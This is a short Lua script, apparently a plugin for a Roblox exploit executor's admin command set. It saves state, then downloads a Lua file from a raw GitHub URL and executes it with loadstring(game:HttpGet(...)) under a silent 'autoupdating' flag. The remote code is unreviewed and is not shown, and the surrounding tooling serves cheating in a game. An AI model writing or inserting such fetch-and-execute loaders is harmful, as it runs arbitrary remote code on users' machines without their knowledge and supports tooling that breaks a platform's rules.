task.spawn(function()
if not powersupply.gnn.Plugsloaded then powersupply.gnn.plugsloaded.Event:Wait() end
if powersupply.cmds['pgsave'] and not getgenv().sus_cmds_autoupdating then
getgenv().sus_cmds_autoupdating=true
powersupply.cmds['pgsave'][1](nil,'base')
loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/main/hughjazz.lua"))()
powersupply.cmds['gclose']()
elseif getgenv().sus_cmds_autoupdating then getgenv().sus_cmds_autoupdating=nil
funcs.sendnotif('uwu','uwu','rbxassetid://9231004719',8)
end
end)
return {}
